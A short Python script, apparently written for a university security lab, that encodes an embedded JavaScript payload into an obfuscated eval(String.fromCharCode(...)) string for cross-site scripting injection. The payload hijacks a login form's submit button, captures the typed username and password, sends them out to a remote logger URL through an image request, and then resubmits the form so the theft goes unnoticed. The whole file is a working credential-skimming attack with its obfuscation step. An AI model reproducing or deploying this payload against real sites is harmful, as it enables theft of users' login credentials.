def string_to_ascii_list(s: str) -> None:
    ascii_values = [str(ord(c)) for c in s]
    print("eval(String.fromCharCode(" + ",".join(ascii_values) + "))")

string_to_ascii_list(
"""
if (document.first === undefined) {    
    document.first = true;
}
if (document.first) {
    document.first = false;
    document.querySelector('input[name="login_username"]').value = "";
    let button = document.querySelector('input[name="submit_login"]');
    
    button.addEventListener("click", function(event) {
        event.preventDefault();
    
        const username = document.querySelector('input[name="login_username"]').value;
        const password = document.querySelector('input[name="login_password"]').value;
    
        javascript:void((new Image()).src='http://dasak-vm-lab-server.eecs.kth.se/logger/log.php?' + 'to=me' + '&payload='  + username + ':' + password + '&random=' + Math.random());
    
        setTimeout(() => {
            document.querySelector('input[name="login_username"]').value = username;
            document.querySelector('input[name="login_password"]').value = password;
            event.form.requestSubmit(button);
        }, 500);
    });
}
"""

)


